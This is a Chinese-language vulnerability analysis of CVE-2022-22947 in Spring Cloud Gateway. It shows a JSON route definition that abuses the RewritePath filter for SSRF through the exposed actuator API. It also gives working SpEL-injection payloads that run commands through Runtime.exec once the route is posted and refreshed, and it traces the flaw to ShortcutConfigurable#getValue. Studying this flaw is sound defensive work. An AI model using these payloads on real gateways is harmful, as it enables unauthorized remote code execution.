<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="cae9fe381efd1493750a9d7f8af6b167">Java安全-CVE-2022-22947漏洞分析</h1>
<h2 data-content="1" id="a0b132682a6dcdfc4612aa262a7ed26a">Spring cloud Gateway</h2>
<blockquote>
<p>Spring Cloud Gateway aims to provide a simple, yet effective way to route to APIs and provide cross cutting concerns to them such as: security, monitoring/metrics, and resiliency.</p>
</blockquote>
<h3 data-content="1" id="3649fc2d3b561bbf1b3b0adb5db33ec4">架构</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211937-859573b2-4a30-1.png"/></p>
<blockquote>
<p>Clients make requests to Spring Cloud Gateway. If the Gateway Handler Mapping determines that a request matches a route, it is sent to the Gateway Web Handler. This handler runs the request through a filter chain that is specific to the request. The reason the filters are divided by the dotted line is that filters can run logic both before and after the proxy request is sent. All “pre” filter logic is executed. Then the proxy request is made. After the proxy request is made, the “post” filter logic is run.</p>
</blockquote>
<p>客户端发起请求给网关，网关处理映射找到一个匹配的路由，然后发送该给网关的Web处理器，处理器会通过一条特定的Filter链来处理请求，最后会发出代理请求，Filter 不仅仅做出预过滤，代理请求发出后也会进行过滤。</p>
<h3 data-content="1" id="c880f7913be028433ef590b8b39656c3">自定义路由</h3>
<p><a href="https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api" target="_blank">https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api</a></p>
<p>如果配置了暴露Endpoint ，允许 jmx 或者web访问，则可以通过/gateway 接口与网关进行交互，但通常这些<code>actuator</code>接口在内网，或者springboot security 设置了内网的ip白名单， 需要存在一些未授权的访问。</p>
<h3 data-content="1" id="00ac2de279cec03208c93545d45d5a7d">配置中允许web访问api</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211937-85aa4d64-4a30-1.png"/></p>
<h3 data-content="1" id="1e853a0c4a6528b4229d5b8fba2aa972">网关允许的操作</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211938-85d97314-4a30-1.png"/></p>
<h3 data-content="1" id="bf9c46c9f617f0eeedfc3c25d1f6f971">增加一个路由</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211938-86071cb0-4a30-1.png"/></p>
<p>这里是官方提供的Demo，需要的数据里filters没有给，从架构上来看，filters是最主要的，可以通过此来应用filter给路由。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211938-863038fc-4a30-1.png"/></p>
<p>这也是造成漏洞主要原因。添加路由后需要 refresh。</p>
<p>网关的设定就是会向uri发起请求的，他的功能就是这样，按照他的demo，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211938-8645d6d0-4a30-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211939-865d2876-4a30-1.png"/></p>
<p>可以发现路由请求时，会把原始的route一并交给服务器，并不能请求到任意的路径。</p>
<p>所以过滤器的作用就派上用场了。</p>
<h3 data-content="1" id="7aa95b9c30a82f698f902bc637e449a0">内置的过滤器</h3>
<p><a href="https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory" target="_blank">https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory</a></p>
<h4 data-content="1" id="def4de01578c8c9323212edb084c55ff">RewritePath</h4>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211939-868cdd64-4a30-1.png"/></p>
<p>官方的说法是会执行一个正则的过滤，比如 /red/blue  其实会在请求时 设置为 /blue  这是我们想看到的。</p>
<p>稍微改造一下，</p>
<p>向<code>actuator/gateway/routes/red</code>post 如下json 数据</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="nt">"predicates"</span><span class="p">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"Path"</span><span class="p">,</span>
      <span class="nt">"args"</span><span class="p">:</span> <span class="p">{</span>
        <span class="nt">"_genkey_0"</span><span class="p">:</span> <span class="s2">"/red/**"</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">],</span>
  <span class="nt">"filters"</span><span class="p">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"RewritePath"</span><span class="p">,</span>
      <span class="nt">"args"</span><span class="p">:</span> <span class="p">{</span>
        <span class="nt">"_genkey_0"</span><span class="p">:</span> <span class="s2">"/red/?(?&lt;path&gt;.*)"</span><span class="p">,</span>
        <span class="nt">"_genkey_1"</span><span class="p">:</span> <span class="s2">"/${path}"</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">],</span>
  <span class="nt">"uri"</span><span class="p">:</span> <span class="s2">"http://xxxx:1234"</span><span class="p">,</span>
  <span class="nt">"order"</span><span class="p">:</span> <span class="mi">0</span>
<span class="p">}</span>
</pre></div>
<p>然后 post <code>/actuator/gateway/refresh</code></p>
<p>接着访问</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211939-86b53778-4a30-1.png"/></p>
<p>那么 SSRF 就成功了。</p>
<p>当然 不仅仅只有这一个过滤器，类似的还有<code>StripPrefix</code> 和<code>SetPath</code></p>
<p>进入正题，RCE。</p>
<h2 data-content="1" id="93a100934b34bc9c9959d5f1cc53ab91">CVE-2022-22947</h2>
<p>上面的SSRF其实是网关本身的功能就是这样，panda师傅也讲他类似 phpMyAdmin 的后台sql 注入，对味儿了。</p>
<p>网上的漏洞Payload</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="nt">"id"</span><span class="p">:</span> <span class="s2">"hacktest"</span><span class="p">,</span>
  <span class="nt">"filters"</span><span class="p">:</span> <span class="p">[{</span>
    <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"AddResponseHeader"</span><span class="p">,</span>
    <span class="nt">"args"</span><span class="p">:</span> <span class="p">{</span>
      <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"Result"</span><span class="p">,</span>
      <span class="nt">"value"</span><span class="p">:</span> <span class="s2">"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"</span>
    <span class="p">}</span>
  <span class="p">}],</span>
  <span class="nt">"uri"</span><span class="p">:</span> <span class="s2">"http://example.com"</span>
<span class="p">}</span>
</pre></div>
<p>看到是SPEL注入！直接全局 搜<code>**StandardEvaluationContext**</code></p>
<p><code>org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211939-86dc94f8-4a30-1.png"/></p>
<p>这是接口的一个静态方法，所有实现类都可以进行调用。</p>
<p>这个接口的名字<code>ShortCutConfigurable</code>，可以理解为快捷配置。</p>
<p>路由的定义本来是通过配置文件来完成的，程序提供动态路由的定义，程序重启后，动态路由便不存在了。</p>
<p>按照文档的某个样例作为配置文件来启动程序。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211940-87132b9e-4a30-1.png"/></p>
<p>spring 和 tomcat 项目的配置中一般都是支持表达式的，在配置中使用是没有问题的且合理的。</p>
<p>程序启动时，配置中的路由会被加载，在<code>org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue</code>打断点，直接就走到了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211940-875ba0ae-4a30-1.png"/></p>
<p>并不是一个合法的spel表达式，所以没有取值，这里的变量其实使用另一种方式获取的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211941-878150f6-4a30-1.png"/></p>
<p>前面说了，程序是支持动态路由的定义，是否也允许快捷配置的那一套，这样的话，predicates或者filters中的值如果是合法的Spel表达式，那么就会被评估。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211941-87ab6828-4a30-1.png"/></p>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="nt">"predicates"</span><span class="p">:[</span>
        <span class="p">{</span>
            <span class="nt">"name"</span><span class="p">:</span><span class="s2">"Path"</span><span class="p">,</span>
            <span class="nt">"args"</span><span class="p">:{</span>
                <span class="nt">"_genkey_0"</span><span class="p">:</span><span class="s2">"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">],</span>
    <span class="nt">"uri"</span><span class="p">:</span><span class="s2">"http://127.0.0.1:9999"</span><span class="p">,</span>
    <span class="nt">"order"</span><span class="p">:</span><span class="mi">0</span>
<span class="p">}</span>
</pre></div>
<p>然后post  refresh 接口刷新，载入我们定义的路由，就会触发漏洞。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211941-87cb1862-4a30-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211941-87f1cf34-4a30-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211941-8809c6f2-4a30-1.png"/></p>
<p>这是panda师傅的观点，但我认为此漏洞不在于<code>AddResponseHeaderGatewayFilterFactory</code>，而任何的Filter和predicates都会触发，在载入路由的时候（refresh 或者 程序启动时）。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012211942-88264ea8-4a30-1.png"/></p>
<h2 data-content="1" id="3112e2db555299e9acfc24aa53a4c515">参考</h2>
<p><a href="https://www.cnpanda.net/sec/1159.html" target="_blank">https://www.cnpanda.net/sec/1159.html</a></p>
<p><a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/" target="_blank">https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/</a></p>
</div>
</div>